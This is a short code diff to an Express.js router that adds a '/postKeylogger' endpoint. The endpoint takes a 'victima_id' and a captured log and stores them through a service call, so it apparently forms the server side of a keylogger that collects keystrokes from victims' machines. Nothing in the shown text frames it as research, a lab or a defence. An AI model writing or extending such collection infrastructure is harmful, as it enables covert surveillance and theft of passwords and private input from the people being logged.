@@ -15,13 +15,17 @@ router.get('/', async (req, res) => {
       }
 });
 
-router.post('/',(req,res)=>{
+
+router.post('/postKeylogger',async (req,res)=>{
+  try{
     const body=req.body;
-    res.json({
-        message:'log created',
-        data:body
-    });
-})
+    const log= await service.postLog(body.victima_id,body.log);
+    res.json(log);
+  }catch(error){
+    console.log(error);
+  }
+});
+
 
 
 module.exports=router;
